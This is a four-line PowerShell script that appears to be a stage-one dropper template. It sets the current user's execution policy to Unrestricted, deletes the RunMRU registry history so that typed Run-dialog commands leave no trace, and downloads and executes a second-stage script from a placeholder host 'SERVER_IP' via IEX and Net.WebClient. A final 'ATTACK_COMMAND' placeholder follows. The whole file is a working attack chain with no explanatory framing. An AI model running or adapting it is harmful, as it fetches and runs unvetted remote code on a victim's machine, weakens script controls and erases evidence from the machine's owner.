Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
IEX(New-Object Net.WebClient).DownloadString('http://SERVER_IP/?stage=2')
ATTACK_COMMAND